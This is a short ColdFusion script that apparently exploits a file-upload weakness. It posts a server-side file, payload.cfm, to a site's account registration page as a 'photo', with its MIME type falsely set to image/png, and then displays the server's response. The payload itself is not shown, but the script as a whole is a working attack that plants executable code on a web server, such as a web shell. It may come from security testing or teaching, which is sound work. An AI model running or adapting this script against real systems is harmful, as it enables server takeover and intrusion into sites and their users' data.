<cfset reqUrl = getPageContext().getRequest().getRequestURL()>
<cfset reqUrl = replaceNoCase(reqUrl, cgi.script_name, "/my-account/register.cfm")>


<cfhttp url="#reqUrl#" method="POST">
	<cfhttpparam type="file" name="photo" mimetype="image/png" file="#expandPath("./payload.cfm")#"> 
</cfhttp>

<cfoutput>
<h1>Requesting: <small>#reqUrl#</small></h1>
<hr>#cfhttp.fileContent#
</cfoutput>